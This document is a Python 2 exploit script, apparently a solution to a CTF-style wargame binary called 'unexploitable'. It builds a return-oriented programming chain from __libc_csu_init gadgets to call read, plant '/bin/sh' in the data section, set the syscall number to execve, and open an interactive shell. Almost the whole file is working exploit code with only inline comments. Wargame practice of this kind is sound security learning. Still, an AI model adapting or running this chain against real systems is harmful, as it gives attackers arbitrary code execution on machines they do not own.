#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *
from time import sleep

# settings
local   = True
debug   = True

if local:
    target  = '/home/unexploitable/unexploitable'
else:
    target  = ('0', 0)

# get io
io  = mk(target, debug)

# global
syscall_addr        = 0x00400560
com_gadget1_addr    = 0x004005e6
com_gadget2_addr    = 0x004005d0
got_read            = 0x00601000
data_addr           = 0x00601000
bin_sh_addr         = data_addr + 0x800
junk                = 0x18
execve_syscall_id   = 0x3b

# exp
def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += 'A' * 0x8
    payload += l64(0x0)     # rbx be 0x0
    payload += l64(0x1)     # rbp be 0x1
    payload += l64(jmp2)    # r12 jump to
    payload += l64(arg1)    # r15 -> edi    arg1
    payload += l64(arg2)    # r14 -> rsi    arg2
    payload += l64(arg3)    # r13 -> rdx    arg3
    payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
    payload += 'A' * 0x38
    return payload

def exp():
    # io.hint([0x0000000000400577])
    payload  = 'A' * junk 
    payload += com_gadget(com_gadget1_addr, com_gadget2_addr, jmp2 = got_read,
            arg1 = 0x0,
            arg2 = bin_sh_addr,
            arg3 = execve_syscall_id)
    payload += com_gadget(com_gadget1_addr, com_gadget2_addr, jmp2 = bin_sh_addr + 0x8,
            arg1 = bin_sh_addr,
            arg2 = 0x0,
            arg3 = 0x0)

    sleep(3)
    io.pr(payload)
    sleep(3)
    io.pr(('/bin/sh\x00' + l64(syscall_addr)).ljust(execve_syscall_id, '\x00'))

    io.interact()

# main
if __name__ == '__main__':
    exp()
